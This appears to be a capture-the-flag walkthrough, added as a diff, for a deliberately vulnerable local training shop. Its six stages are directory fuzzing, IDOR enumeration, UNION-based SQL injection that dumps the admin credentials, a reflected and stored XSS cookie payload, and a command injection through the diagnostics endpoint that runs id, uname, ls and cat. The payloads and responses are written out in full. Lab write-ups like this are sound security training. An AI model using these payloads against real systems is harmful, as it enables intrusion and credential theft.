@@ -1,0 +1,128 @@
+Stage 1 - Reconnaissance (availability of standard service files)
+1. ffuf -u http://127.0.0.1:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt  
+Result: robots.txt              [Status: 200, Size: 60, Words: 4, Lines: 5, Duration: 69ms]
+http://127.0.0.1:5000/robots.txt - FLAG{ROBOTS_DISCOVERED}
+
+Stage 2 - Hidden Directories
+1. ffuf -u http://127.0.0.1:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt  
+Result: backup                  [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 56ms]
+2. ffuf -u http://127.0.0.1:5000/backup/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt
+Result: flag2.txt               [Status: 200, Size: 28, Words: 1, Lines: 2, Duration: 64ms]
+http://127.0.0.1:5000/backup/flag2.txt - FLAG{DIRBUSTER_FOUND_FLAG2}
+
+Stage 3 - IDOR
+1. ffuf -u "http://127.0.0.1:5000/product?id=FUZZ"  -w <(seq 0 1000) -fc 404 -t 50 
+Result: 333                     [Status: 200, Size: 9781, Words: 2029, Lines: 409, Duration: 62ms]
+2. BurpSuite Intruder 
+GET /product?id=$1$ HTTP/1.1
+Sniper attack -> Payload: Numbers -> Number Range: Sequential: from 0 To 1000
+http://127.0.0.1:5000/product?id=333 - FLAG{HIDDEN_PRODUCT_333}
+
+Stage 4 - SQL Injection
+BurpSuite Repeater
+1. [ Stage4_SQLInjection1.png ]: GET /search?q=' 
+Response: 500 INTERNAL SERVER ERROR
+2. [ Stage4_SQLInjection2.png ]: GET /search?q='-- 
+Response: 200 OK
+3. [ Stage4_SQLInjection3_1.png ]: q=test' ORDER BY 5 --
+GET /search?q=test'%20ORDER%20BY%205%20--%20
+Response: 200 OK
+[ Stage4_SQLInjection3_2.png ]: q=test' ORDER BY 6 --
+GET /search?q=test'%20ORDER%20BY%206%20--%20 
+Response: 500 INTERNAL SERVER ERROR
+4.Definition of displayed columns [ Stage4_SQLInjection4.png ]: ' UNION SELECT 1, 2, 3, 4, 5 --
+GET /search?q=%27+UNION+SELECT+1%2C+2%2C+3%2C+4%2C+5+-- 
+Response: 200 OK
+5. Getting a list of tables [ Stage4_SQLInjection5.png ]: ' UNION SELECT 1, name, 3, 4, 5 FROM sqlite_master WHERE type='table' --
+GET /search?q=%27+UNION+SELECT+1%2C+name%2C+3%2C+4%2C+5+FROM+sqlite_master+WHERE+type%3D%27table%27+--+
+Response: 
+Tables in response: 
+- products
+- reviews
+- sqlite_sequence
+- training_secrets
+- users
+6. Obtaining the structure of the table
+TABLE users: [ Stage4_SQLInjection6_1.png ]
+' UNION SELECT 1, sql, 3, 4, 5 FROM sqlite_master WHERE name='users' --
+GET /search?q=%27+UNION+SELECT+1%2C+sql%2C+3%2C+4%2C+5+FROM+sqlite_master+WHERE+name%3D%27users%27+--+
+Response: 
+CREATE TABLE users (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  username TEXT UNIQUE NOT NULL,
+  password_b64 TEXT NOT NULL
+)
+
+TABLE training_secrets: [ Stage4_SQLInjection6_2.png ]
+' UNION SELECT 1, sql, 3, 4, 5 FROM sqlite_master WHERE name='training_secrets' --
+GET /search?q=%27+UNION+SELECT+1%2C+sql%2C+3%2C+4%2C+5+FROM+sqlite_master+WHERE+name%3D%27training_secrets%27+--+
+Response: 
+ CREATE TABLE training_secrets (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  name TEXT UNIQUE NOT NULL,
+  value_b64 TEXT NOT NULL
+)
+7. Extract the data from users
+TABLE users: [ Stage4_SQLInjection7_1.png ]
+' UNION SELECT 1, username, password_b64, 4, 5 FROM users --
+GET /search?q=%27+UNION+SELECT+1%2C+username%2C+password_b64%2C+4%2C+5+FROM+users+--+
+Response: 
+username: admin
+password_b64: U3RyMG5nR1Bhc3M0 (decoded base64: Str0ngGPass4)
+password: Str0ngGPass4
+
+Extract the data from training_secrets (admin_password_b64)
+TABLE training_secrets: [ Stage4_SQLInjection7_2.png ]
+' UNION SELECT 1, name, value_b64, 4, 5 FROM training_secrets --
+GET /search?q=%27+UNION+SELECT+1%2C+name%2C+value_b64%2C+4%2C+5+FROM+training_secrets+--+
+Response:
+admin_password_b64: U3RyMG5nR1Bhc3M0 (decoded base64: Str0ngGPass4)
+
+Stage 5 - XSS
+Basic
+URL: http://127.0.0.1:5000/product?id=1&name=test&comment=%3Cscript%3Ealert(%27Basicallert_XSS%27)%3C/script%3E
+Expected result: alert is displayed Stage5_XSS1.png
+
+Stored XSS
+On Product page Enter into Comment field and click on Submit button
+<div >XSS CONFIRMED! Cookie: <span id=c></span><script>document.getElementById('c').innerText=document.cookie</script></div>
+Expected result: alert is displayed Stage5_XSS2.png
+
+Stage 6 - RCE 
+From Stage 4 - SQL Injection - username: admin, password: Str0ngGPass4
+OS Command Injection Detection
+Send to BurpSuite Repeater 
+GET /admin/diagnostics?target=localhost HTTP/1.1
+1. Change target localhost to localhost; id(who starts the server) - [ Stage6_RCE1.png ]
+GET /admin/diagnostics?target=localhost%3B+id HTTP/1.1
+Response: 
+PING localhost ...
+uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)
+
+2.uname -a (OS/core information) - [ Stage6_RCE2.png ]
+GET /admin/diagnostics?target=localhost%3B+uname+-a HTTP/1.1
+Response: 
+Linux fdafad1849cd 6.18.5+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.5-1kali1 (2026-01-19) x86_64 GNU/Linux
+
+3. ls /app (files in the container) - [ Stage6_RCE3.png ]
+GET /admin/diagnostics?target=localhost%3B+ls+-la+/app HTTP/1.1
+Response: 
+drwxr-xr-x 1 appuser appuser  4096 Mar  4 11:54 .
+drwxr-xr-x 1 root    root     4096 Mar  4 11:54 ..
+drwxr-xr-x 2 appuser appuser  4096 Mar  4 11:54 __pycache__
+-rw-rw-rw- 1 appuser appuser  5072 Feb 24 10:32 app.py
+-rw-rw-rw- 1 appuser appuser  4171 Feb 12 16:25 app.py.bak
+drwxrwxrwx 1 appuser appuser  4096 Feb 12 20:48 backup
+-rw-rw-rw- 1 appuser appuser    32 Feb  8 14:56 flag.txt
+-rw-rw-rw- 1 appuser appuser  1611 Feb 24 10:31 init_db.py
+-rw-rw-rw- 1 appuser appuser   531 Feb  8 14:56 init_db.py.bak
+-rw-rw-rw- 1 appuser appuser     6 Feb  8 14:55 requirements.txt
+-rw-r--r-- 1 appuser appuser 32768 Mar  4 11:54 shop.db
+drwxrwxrwx 1 appuser appuser  4096 Feb 12 20:34 templates
+
+5. read flag -  [ Stage6_RCE4.png ]
+GET /admin/diagnostics?target=localhost%3B+cat+/app/flag.txt HTTP/1.1
+Response: 
+FLAG{RCE_INSIDE_CONTAINER_ONLY}
+
+
